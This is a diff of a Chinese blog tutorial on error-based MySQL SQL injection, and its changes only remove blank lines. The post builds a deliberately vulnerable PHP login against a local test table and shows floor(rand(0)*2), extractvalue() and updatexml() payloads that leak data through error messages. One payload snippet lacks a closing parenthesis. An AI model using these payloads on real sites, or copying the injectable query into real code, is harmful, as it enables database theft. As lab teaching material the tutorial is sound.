@@ -27,22 +27,18 @@ tags: [security,web]
 首先在本地建立一个测试数据库 ``sqli``：
 
 {% highlight mysql %}
-
 mysql> create database sqli;
-
 {% endhighlight %}
 
 建立一个测试表 ``user`` 和插入一些施力数据：
 
 {% highlight mysql %}
-
 mysql> create table user (
 		id int(11) not null auto_increment primary key,
 		name varchar(20) not null,
 		pass varchar(32) not null
 	);
 mysql> insert into user (name, pass) values ('admin', md5('123456')), ('guest', md5('guest'));
-
 {% endhighlight %}
 
 数据库准备好后，在站点根目录或者其子目录建立如下文件：
@@ -50,7 +46,6 @@ mysql> insert into user (name, pass) values ('admin', md5('123456')), ('guest', 
 ``index.php``
 
 {% highlight php %}
-
 <?php
 $conn = mysql_connect("localhost", "root", "root");
 if (!$conn) {
@@ -95,7 +90,6 @@ mysql_close();
 </center>
 </body>
 </html>
-
 {% endhighlight %}
 
 我将上述文件放在了站点的子目录 ``sqli`` 下，访问 ``http://localhost/sqli`` 可以看到。
@@ -103,12 +97,10 @@ mysql_close();
 上面这段php验证登陆的代码很简单，注意下面这几行：
 
 {% highlight php %}
-
 $name = $_GET['name'];
 $pass = md5($_GET['pass']);
 
 $query = "select * from user where name='$name' and pass='$pass'";
-
 {% endhighlight %}
 
 登陆验证部分，取了 ``$_GET['name']`` 和 ``$_GET['pass']`` 的值，并且提交的密码经过了 ``md5()`` 的处理才插入到查询语句中，所以 ``$pass`` 的值不可控。
@@ -141,9 +133,7 @@ $query = "select * from user where name='$name' and pass='$pass'";
 这里做一个测试，以前面所建的 ``user`` 表为例：
 
 {% highlight mysql %}
-
 mysql> select count(*),floor(rand(0)*2) from user group by 2;
-
 {% endhighlight %}
 
 输出可能为下列这几种情况：
@@ -201,9 +191,7 @@ mysql> select count(*),floor(rand(0)*2) from user group by 2;
 然后再次测试，这里为了尽可能多地出现不确定且可重复的值，将查找表换为 ``information_schema.tables``：
 
 {% highlight mysql %}
-
 mysql> select count(*),floor(rand(0)*2) from information_schema.tables group by 2;
-
 {% endhighlight %}
 
 此时就必报错：
@@ -213,9 +201,7 @@ mysql> select count(*),floor(rand(0)*2) from information_schema.tables group by 
 因此我们可以将需要查询的语句与 ``floor(rand(0)*2)`` 进行字符连接，就可以通过报错来得到信息。
 
 {% highlight mysql %}
-
 mysql> select count(*),concat(user(),floor(rand(0)*2)) from information_schema.tables group by 2;
-
 {% endhighlight %}
 
 得到 ``user()`` 的数据：
@@ -232,9 +218,7 @@ mysql> select count(*),concat(user(),floor(rand(0)*2)) from information_schema.t
 example1：
 
 {% highlight mysql %}
-
 select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a
-
 {% endhighlight %}
 
 本地环境测试：
@@ -248,9 +232,7 @@ select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information
 example2：
 
 {% highlight mysql %}
-
 select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2))
-
 {% endhighlight %}
 
 本地环境测试：
@@ -264,9 +246,7 @@ select count(*) from information_schema.tables group by concat(user(),floor(rand
 法二：``extractvalue()`` 函数，利用XPath语法错误导致报错：
 
 {% highlight mysql %}
-
 extractvalue(1,concat(user())
-
 {% endhighlight %}
 
 本地环境测试：
@@ -280,9 +260,7 @@ extractvalue(1,concat(user())
 法三：``updatexml`` 函数，同样是利用语法错误导致报错：
 
 {% highlight mysql %}
-
 updatexml(1,concat(user()),1)
-
 {% endhighlight %}
 
 本地环境测试：
